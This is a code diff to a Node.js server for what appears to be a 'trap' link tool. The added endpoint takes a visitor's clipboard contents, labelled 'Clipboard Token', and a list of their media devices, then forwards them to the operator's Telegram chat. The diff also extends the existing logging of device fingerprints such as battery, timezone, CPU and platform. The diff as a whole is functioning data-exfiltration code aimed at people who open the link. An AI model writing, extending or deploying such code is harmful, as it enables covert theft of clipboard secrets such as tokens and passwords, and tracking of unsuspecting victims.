@@ -136,21 +136,43 @@ async function startServer() {
         status = '🏁 <i>Status: Silent Logging Berhasil (Tanpa GPS).</i>';
       } else if (tmplId === '3') {
         header = '🚀 <b>FAST LOG REVEALED</b> 🚀';
-        status = '🏁 <i>Status: Metadata Captured (Tanpa GPS).</i>';
+        status = '🏁 <i>Status: Clipboard & Metadata Captured.</i>';
       }
 
-      const msg = `${header}\n` +
+      let msg = `${header}\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
                   `📁 <b>Template:</b> <code>${escapeHTML(templateName)}</code>\n` +
-                  `🖥️ <b>Resolution:</b> <code>${escapeHTML(data.screen || 'N/A')}</code>\n` +
-                  `🔋 <b>Battery:</b> <code>${escapeHTML(data.battery || 'N/A')}</code>\n` +
-                  `🌍 <b>Timezone:</b> <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
-                  `⚙️ <b>Specs:</b> <code>${escapeHTML(String(data.cores || 'N/A'))} Core / ${escapeHTML(String(data.mem || 'N/A'))} GB RAM</code>\n` +
+                  `🖥️ <b>Res:</b> <code>${escapeHTML(data.screen || 'N/A')}</code>\n` +
+                  `🔋 <b>Bat:</b> <code>${escapeHTML(data.battery || 'N/A')}</code>\n` +
+                  `🌍 <b>TZ:</b> <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
+                  `⚙️ <b>CPU:</b> <code>${escapeHTML(String(data.cores || 'N/A'))} Core</code>\n` +
                   `🍎 <b>Platform:</b> <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
                   `${status}`;
 
       botInstance.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
+    }
+    res.sendStatus(200);
+  });
+
+  // Handle Extra Data (Clipboard, Media, etc)
+  app.post('/api/log/:id/extra', (req, res) => {
+    const id = req.params.id;
+    const chatId = getChatIdFromTrapId(id);
+    if (botInstance && chatId) {
+      const data = req.body;
+      let extraMsg = `📎 <b>EXTRA DATA CAPTURED!</b> 📎\n` +
+                     `━━━━━━━━━━━━━━━━━━━━\n`;
+      
+      if (data.clipboard) {
+        extraMsg += `📋 <b>Clipboard Token:</b>\n<code>${escapeHTML(data.clipboard)}</code>\n`;
+      }
+      if (data.media) {
+        extraMsg += `🎙️ <b>Media Devices:</b>\n<pre>${escapeHTML(data.media)}</pre>\n`;
+      }
+      
+      extraMsg += `━━━━━━━━━━━━━━━━━━━━`;
+      botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error);
     }
     res.sendStatus(200);
   });
